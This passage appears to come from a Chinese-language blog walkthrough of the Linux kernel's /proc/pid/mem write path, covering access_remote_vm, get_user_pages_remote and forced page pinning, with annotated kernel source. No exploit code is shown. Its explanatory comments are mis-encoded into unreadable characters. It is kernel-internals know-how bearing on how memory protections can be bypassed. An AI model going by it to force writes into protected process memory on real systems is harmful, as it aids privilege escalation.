class="hljs-keyword">goto</span> <span class="hljs-built_in">free</span>;<br><span class="hljs-comment">//é€šè¿‡ä¸€ä¸ªå¾ªç¯å†™å…¥counté•¿æ•°æ®, copy_from_useræŠŠæ•°æ®æ¬è¿åˆ°å†…æ ¸ç¼“å†²åŒºä¸­, å†è°ƒç”¨access_remote_vm()å†™å…¥è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­</span><br><span class="hljs-keyword">while</span> (count &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//countè¡¨ç¤ºå‰©ä½™è¦å†™å…¥çš„é•¿åº¦</span><br><span class="hljs-type">int</span> this_len = <span class="hljs-type">min_t</span>(<span class="hljs-type">int</span>, count, PAGE_SIZE);<span class="hljs-comment">//æœ¬æ¬¡å†™å…¥å¤šå°‘</span><br><span class="hljs-comment">//æŠŠdataä»ç”¨æˆ·ç©ºé—´bufå¤åˆ¶åˆ°å†…æ ¸çš„ä¸´æ—¶é¡µ</span><br><span class="hljs-keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;<br>copied = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//è¯»å†™åˆ«äººçš„è™šæ‹Ÿåœ°å€ç©ºé—´</span><br>this_len = access_remote_vm(mm, addr, page, this_len, write);<br><span class="hljs-keyword">if</span> (!this_len) &#123;<br><span class="hljs-keyword">if</span> (!copied)<br>copied = -EIO;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//è¯»å–ï¼ŒæŠŠå†…æ ¸è¯»åˆ°çš„æ•°æ®å¤åˆ¶åˆ°ç”¨æˆ·buf</span><br><span class="hljs-keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;<br>copied = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>buf += this_len;<span class="hljs-comment">//ç”¨æˆ·ç¼“å†²åŒº</span><br>addr += this_len;<span class="hljs-comment">//è¯»å†™åœ°å€</span><br>copied += this_len;<span class="hljs-comment">//è¯»å†™äº†å¤šå°‘å­—èŠ‚</span><br>count -= this_len;<span class="hljs-comment">//è¿˜å‰©å¤šå°‘å­—èŠ‚</span><br>&#125;<br>*ppos = addr;<br><br>mmput(mm);<br><span class="hljs-built_in">free</span>:<br>free_page((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page);<br><span class="hljs-keyword">return</span> copied;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>access_remote_vm()</code>æ˜¯å¯¹<code>__access_remote_vm</code>çš„åŒ…è£…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">access_remote_vm</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr,</span><br><span class="hljs-params"><span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)</span><br>&#123;<br><span class="hljs-keyword">return</span> __access_remote_vm(<span class="hljs-literal">NULL</span>, mm, addr, buf, len, write);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="access-remote-vm"><a href="#access-remote-vm" class="headerlink" title="__access_remote_vm()"></a>__access_remote_vm()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Access another process&#x27; address space as given in mm.  If non-NULL, use the</span><br><span class="hljs-comment"> * given task for page fault accounting.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//è®¿é—®mmæŒ‡å‘çš„å…¶ä»–è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œå¦‚æœtskéNULLï¼Œåˆ™ç”¨æ¥è¿›è¡Œç¼ºé¡µå¼‚å¸¸è®¡æ•°</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __access_remote_vm(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br><span class="hljs-type">void</span> *old_buf = buf;<br><br>down_read(&amp;mm-&gt;mmap_sem);<span class="hljs-comment">//è·å–mmap_semä¿¡å·é‡</span><br><span class="hljs-comment">/* ignore errors, just check how much was successfully transferred */</span><br><span class="hljs-keyword">while</span> (len) &#123;<span class="hljs-comment">//å¾ªç¯ï¼Œç›´åˆ°å†™å…¥lené•¿åº¦</span><br><span class="hljs-type">int</span> bytes, ret, offset;<br><span class="hljs-type">void</span> *maddr;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//æŠŠè¦è®¿é—®çš„å…¶ä»–è¿›ç¨‹çš„é¡µé¢é”å®šåœ¨å†…å­˜ä¸­ï¼Œé¿å…ç¼ºé¡µå¼‚å¸¸ï¼Œè¿™é‡Œåªè·å–1é¡µï¼Œpageå°±æ˜¯é”å®šçš„é‚£ä¸€é¡µ</span><br>ret = get_user_pages_remote(tsk, mm, addr, <span class="hljs-number">1</span>,<br>write, <span class="hljs-number">1</span>, &amp;page, &amp;vma);<br><span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Check if this is a VM_IO | VM_PFNMAP VMA, which</span><br><span class="hljs-comment"> * we can access using slightly different code.</span><br><span class="hljs-comment"> */</span><br>vma = find_vma(mm, addr);<br><span class="hljs-keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)<br>ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,<br>  len, write);<br><span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br>bytes = ret;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>bytes = len;<span class="hljs-comment">//è¦å†™å…¥çš„é•¿åº¦</span><br>offset = addr &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<span class="hljs-comment">//addrçš„é¡µå†…åç§»</span><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            bytes+offset &lt;= PAGE_SIZE</span><br><span class="hljs-comment">            =&gt;å†™å…¥é•¿åº¦+é¡µå†…åç§»&lt;=PAGE_SIZE</span><br><span class="hljs-comment">            =&gt;é”å®šæ˜¯é¡µä¸ºå•ä½çš„ï¼Œå› æ­¤ä¸èƒ½è·¨é¡µå†™å…¥</span><br><span class="hljs-comment">            */</span><br><span class="hljs-keyword">if</span> (bytes &gt; PAGE_SIZE-offset)<br>bytes = PAGE_SIZE-offset;<br><span class="hljs-comment">//æ­¤æ—¶çš„pageä¸ºget_user_pages_remote()ä¸ºç”¨æˆ·å¯»æ‰¾çš„ï¼Œæ˜¯è¢«é”å®šåœ¨å†…å­˜ä¸­çš„é¡µï¼Œkmapå°†å…¶æ˜ å°„åœ¨å†…æ ¸åœ°å€ç©ºé—´ä¸­</span><br>maddr = kmap(page);<br><span class="hljs-keyword">if</span> (write) &#123;<span class="hljs-comment">//å†™å…¥è¯·æ±‚</span><br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                å…ˆè°ƒç”¨copy_to_user_page()è¿›è¡Œå†™å…¥</span><br><span class="hljs-comment">                maddrä¸ºæ ¹æ®addré”å®šçš„é¡µï¼Œoffsetä¸ºaddré¢é¡µå†…åç§»ï¼Œä¸¤è€…ç›¸åŠ å°±æ˜¯è¦å†™å…¥çš„åœ°å€</span><br><span class="hljs-comment">                ç­‰ä»·ä¸ºï¼šmemcpy(maddr + offset, buf, bytes)</span><br><span class="hljs-comment">                */</span><br>copy_to_user_page(vma, page, addr,<br>  maddr + offset, buf, bytes);<br>                <span class="hljs-comment">//æ ‡è®°ä¸ºè„é¡µ</span><br>set_page_dirty_lock(page);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//ç­‰ä»·ï¼šmemcpy(buf, maddr+offset, bytes)</span><br>copy_from_user_page(vma, page, addr,<br>    buf, maddr + offset, bytes);<br>&#125;<br>kunmap(page);<br>put_page(page);<span class="hljs-comment">//é‡Šæ”¾</span><br>&#125;<br>len -= bytes;<br>buf += bytes;<br>addr += bytes;<br>&#125;<br>up_read(&amp;mm-&gt;mmap_sem);<br><br><span class="hljs-keyword">return</span> buf - old_buf;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„æ ¸å¿ƒå°±åœ¨ä¸æ€ä¹ˆæŠŠåˆ«çš„è¿›ç¨‹çš„é¡µé¢é”å®šåœ¨å†…å­˜ä¸­çš„, å› æ­¤<code>get_user_pages_remote()</code>æ˜¯<code>__access_remote_vm()</code>çš„æ ¸å¿ƒå‡½æ•°</p><h4 id="get-user-pages-remote"><a href="#get-user-pages-remote" class="headerlink" title="get_user_pages_remote()"></a>get_user_pages_remote()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * get_user_pages_remote() - pin user pages in memory</span><br><span class="hljs-comment"> * @tsk:the task_struct to use for page fault accounting, or</span><br><span class="hljs-comment"> *NULL if faults are not to be recorded.</span><br><span class="hljs-comment"> * @mm:mm_struct of target mm</span><br><span class="hljs-comment"> * @start:starting user address</span><br><span class="hljs-comment"> * @nr_pages:number of pages from start to pin</span><br><span class="hljs-comment"> * @write:whether pages will be written to by the caller</span><br><span class="hljs-comment"> * @force:whether to force access even when user mapping is currently</span><br><span class="hljs-comment"> *protected (but never forces write access to shared mapping).</span><br><span class="hljs-comment"> * @pages:array that receives pointers to the pages pinned.</span><br><span class="hljs-comment"> *Should be at least nr_pages long. Or NULL, if caller</span><br><span class="hljs-comment"> *only intends to ensure the pages are faulted in.</span><br><span class="hljs-comment"> * @vmas:array of pointers to vmas corresponding to each page.</span><br><span class="hljs-comment"> *Or NULL if the caller does not require them.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns number of pages pinned. This may be fewer than the number</span><br><span class="hljs-comment"> * requested. If nr_pages is 0 or negative, returns 0. If no pages</span><br><span class="hljs-comment"> * were pinned, returns -errno. Each page returned must be released</span><br><span class="hljs-comment"> * with a put_page() call when it is finished with. vmas will only</span><br><span class="hljs-comment"> * remain valid while mmap_sem is held.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Must be called with mmap_sem held for read or write.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * get_user_pages walks a process&#x27;s page tables and takes a reference to</span><br><span class="hljs-comment"> * each struct page that each user address corresponds to at a given</span><br><span class="hljs-comment"> * instant. That is, it takes the page that would be accessed if a user</span><br><span class="hljs-comment"> * thread accesses the given user virtual address at that instant.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This does not guarantee that the page exists in the user mappings when</span><br><span class="hljs-comment"> * get_user_pages returns, and there may even be a completely different</span><br><span class="hljs-comment"> * page there in some cases (eg. if mmapped pagecache has been invalidated</span><br><span class="hljs-comment"> * and subsequently re faulted). However it does guarantee that the page</span><br><span class="hljs-comment"> * won&#x27;t be freed completely. And mostly callers simply care that the page</span><br><span class="hljs-comment"> * contains data that was valid *at some point in time*. Typically, an IO</span><br><span class="hljs-comment"> * or similar operation cannot guarantee anything stronger anyway because</span><br><span class="hljs-comment"> * locks can&#x27;t be held over the syscall boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If write=0, the page must not be written to. If the page is written to,</span><br><span class="hljs-comment"> * set_page_dirty (or set_page_dirty_lock, as appropriate) must be called</span><br><span class="hljs-comment"> * after the page is finished with, and before put_page is called.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * get_user_pages is typically used for fewer-copy IO operations, to get a</span><br><span class="hljs-comment"> * handle on the memory by some means other than accesses via the user virtual</span><br><span class="hljs-comment"> * addresses. The pages may be submitted for DMA to devices or accessed via</span><br><span class="hljs-comment"> * their kernel linear mapping (via the kmap APIs). Care should be taken to</span><br><span class="hljs-comment"> * use the correct cache flushing APIs.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * See also get_user_pages_fast, for performance critical applications.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * get_user_pages should be phased out in favor of</span><br><span class="hljs-comment"> * get_user_pages_locked|unlocked or get_user_pages_fast. Nothing</span><br><span class="hljs-comment"> * should use get_user_pages because it cannot pass</span><br><span class="hljs-comment"> * FAULT_FLAG_ALLOW_RETRY to handle_mm_fault.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">get_user_pages_remote()-æŠŠç”¨æˆ·é¡µé¢é”å®šåœ¨å†…å­˜ä¸­</span><br><span class="hljs-comment">@tskï¼šç”¨äºè¿›è¡Œç¼ºé¡µå¼‚å¸¸è®¡æ•°çš„ä»»åŠ¡æè¿°ç¬¦ï¼Œå¦‚æœæ˜¯NULLçš„è¯å°±ä¸è¿›è¡Œè®°æ•°</span><br><span class="hljs-comment">@mmï¼šç›®æ ‡è™šæ‹Ÿå†…å­˜ç©ºé—´</span><br><span class="hljs-comment">@startï¼šèµ·å§‹ç”¨æˆ·åœ°å€</span><br><span class="hljs-comment">@nr_pagesï¼šä»startå¼€å§‹è¦é”å®šå¤šå°‘é¡µé¢</span><br><span class="hljs-comment">@writeï¼šè¿™äº›è¦é”å®šçš„é¡µé¢æ˜¯å¦éœ€è¦è¢«å†™å…¥</span><br><span class="hljs-comment">@forceï¼šå½“ç”¨æˆ·æ˜ å°„æ­£åœ¨è¢«ä¿æŠ¤æ—¶ï¼Œç”¨äºå­˜æ”¾æŒ‡å‘è¢«é”å®šçš„pagesçš„æŒ‡é’ˆ</span><br><span class="hljs-comment">@vmsï¼šä¸€ä¸ªVMAæŒ‡é’ˆæ•°ç»„ï¼Œç”¨äºå­˜æ”¾æ¯ä¸€ä¸ªé¡µé¢å¯¹åº”çš„VMAå¯¹è±¡</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">è¿”å›è¢«é”å®šçš„é¡µé¢æ•°é‡ï¼Œæœ‰å¯èƒ½æ¯”è¯·æ±‚çš„å°‘ï¼Œå¦‚æœæ˜¯0æˆ–è€…è´Ÿæ•°ï¼Œå°±è¡¨ç¤ºå‡ºé”™äº†</span><br><span class="hljs-comment">pagesä¸­è¿”å›çš„æ¯ä¸€ä¸ªé¡µé¢éƒ½å¿…é¡»é€šè¿‡put_page()è¿›è¡Œé‡Šæ”¾</span><br><span class="hljs-comment">vmasä¸­çš„æŒ‡é’ˆä¼šä¸€ç›´æœ‰æ•ˆï¼Œç›´åˆ°mmap_semè¢«é‡Šæ”¾</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">get_user_pages_remote</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,</span><br><span class="hljs-params"><span class="hljs-type">int</span> write, <span class="hljs-type">int</span> force, <span class="hljs-keyword">struct</span> page **pages,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> vm_area_struct **vmas)</span><br>&#123;<br><span class="hljs-keyword">return</span> __get_user_pages_locked(tsk, mm, start, nr_pages, write, force,<br>       pages, vmas, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">false</span>,<br>       FOLL_TOUCH | FOLL_REMOTE);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>get_user_pages_remote()</code>æ˜¯å¯¹<code>__get_user_pages_locked()</code>çš„åŒ…è£…</p><h4 id="get-user-pages-locked"><a href="#get-user-pages-locked" class="headerlink" title="__get_user_pages_locked()"></a>__get_user_pages_locked()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">long</span> __get_user_pages_locked(<span class="hljs-keyword">struct</span> task_struct *tsk,<span class="hljs-comment">//è¿›è¡Œç¼ºé¡µè®¡æ•°çš„</span><br><span class="hljs-keyword">struct</span> mm_struct *mm,<span class="hljs-comment">//ç›®æ ‡è™šæ‹Ÿå†…å­˜åœ°å€</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start,<span class="hljs-comment">//èµ·å§‹åœ°å€</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,<span class="hljs-comment">//é”å®šå¤šå°‘é¡µ</span><br><span class="hljs-type">int</span> write,    <span class="hljs-comment">//æ˜¯å¦éœ€è¦å†™å…¥</span><br>                          <span class="hljs-type">int</span> force, <span class="hljs-comment">//æ˜¯å¦å¼ºåˆ¶é”å®š</span><br><span class="hljs-keyword">struct</span> page **pages,    <span class="hljs-comment">//é”å®šé¡µé¢çš„æŒ‡é’ˆæ•°ç»„</span><br><span class="hljs-keyword">struct</span> vm_area_struct **vmas,<span class="hljs-comment">//è¢«é”å®šé¡µé¢å¯¹åº”çš„VMAæ•°ç»„æŒ‡é’ˆ</span><br><span class="hljs-type">int</span> *locked, <span class="hljs-comment">//æ˜¯å¦ä½¿ç”¨VM_FAULT_RETRYçš„åŠŸèƒ½ï¼Œè®¾ä¸ºNULL</span><br>                          <span class="hljs-type">bool</span> notify_drop,   <span class="hljs-comment">//ä¸è¿›è¡Œé€šçŸ¥ï¼Œè®¾ä¸ºfalse</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)<span class="hljs-comment">//æ ‡å¿—</span><br>&#123;<br><span class="hljs-type">long</span> ret, pages_done;<br><span class="hljs-type">bool</span> lock_dropped;<br><br><span class="hljs-keyword">if</span> (locked) &#123;<br><span class="hljs-comment">/* if VM_FAULT_RETRY can be returned, vmas become invalid */</span><br>BUG_ON(vmas);<br><span class="hljs-comment">/* check caller initialized locked */</span><br>BUG_ON(*locked != <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (pages)<span class="hljs-comment">//å¦‚æœéœ€è¦è·å–é¡µé¢ï¼Œè®¾ç½®FILL_GETæ ‡å¿—</span><br>flags |= FOLL_GET;<br><span class="hljs-keyword">if</span> (write)<span class="hljs-comment">//å¦‚æœéœ€è¦å†™å…¥ï¼Œè®¾ç½®FOLL_WRITEæ ‡å¿—</span><br>flags |= FOLL_WRITE;<br><span class="hljs-keyword">if</span> (force)<span class="hljs-comment">//æ˜¯å¦å¼ºåˆ¶é”å®š</span><br>flags |= FOLL_FORCE;<br><br>pages_done = <span class="hljs-number">0</span>;<br>lock_dropped = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">for</span> (;;) &#123;<br>ret = __get_user_pages(tsk, mm, start, nr_pages, flags, pages,<br>       vmas, locked);<br><span class="hljs-keyword">if</span> (!locked)<span class="hljs-comment">//å¦‚æœVM_FAULT_RETRYæ— æ³•è§¦å‘ï¼Œå°±ç›´æ¥è¿”å›</span><br><span class="hljs-comment">/* VM_FAULT_RETRY couldn&#x27;t trigger, bypass */</span><br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-comment">/* VM_FAULT_RETRY cannot return errors */</span><br><span class="hljs-keyword">if</span> (!*locked) &#123;<br>BUG_ON(ret &lt; <span class="hljs-number">0</span>);<br>BUG_ON(ret &gt;= nr_pages);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!pages)<br><span class="hljs-comment">/* If it&#x27;s a prefault don&#x27;t insist harder */</span><br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>nr_pages -= ret;<br>pages_done += ret;<br><span class="hljs-keyword">if</span> (!nr_pages)<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (*locked) &#123;<br><span class="hljs-comment">/* VM_FAULT_RETRY didn&#x27;t trigger */</span><br><span class="hljs-keyword">if</span> (!pages_done)<br>pages_done = ret;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">/* VM_FAULT_RETRY triggered, so seek to the faulting offset */</span><br>pages += ret;<br>start += ret &lt;&lt; PAGE_SHIFT;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Repeat on the address that fired VM_FAULT_RETRY</span><br><span class="hljs-comment"> * without FAULT_FLAG_ALLOW_RETRY but with</span><br><span class="hljs-comment"> * FAULT_FLAG_TRIED.</span><br><span class="hljs-comment"> */</span><br>*locked = <span class="hljs-number">1</span>;<br>lock_dropped = <span class="hljs-literal">true</span>;<br>down_read(&amp;mm-&gt;mmap_sem);<br>ret = __get_user_pages(tsk, mm, start, <span class="hljs-number">1</span>, flags | FOLL_TRIED,<br>       pages, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (ret != <span class="hljs-number">1</span>) &#123;<br>BUG_ON(ret &gt; <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!pages_done)<br>pages_done = ret;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>nr_pages--;<br>pages_done++;<br><span class="hljs-keyword">if</span> (!nr_pages)<br><span class="hljs-keyword">break</span>;<br>pages++;<br>start += PAGE_SIZE;<br>&#125;<br><span class="hljs-keyword">if</span> (notify_drop &amp;&amp; lock_dropped &amp;&amp; *locked) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We must let the caller know we temporarily dropped the lock</span><br><span class="hljs-comment"> * and so the critical section protected by it was lost.</span><br><span class="hljs-comment"> */</span><br>up_read(&amp;mm-&gt;mmap_sem);<br>*locked = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">return</span> pages_done;<br>&#125;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨åˆ°<code>__get_user_pages()</code></p><h4 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="__get_user_pages()"></a>__get_user_pages()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 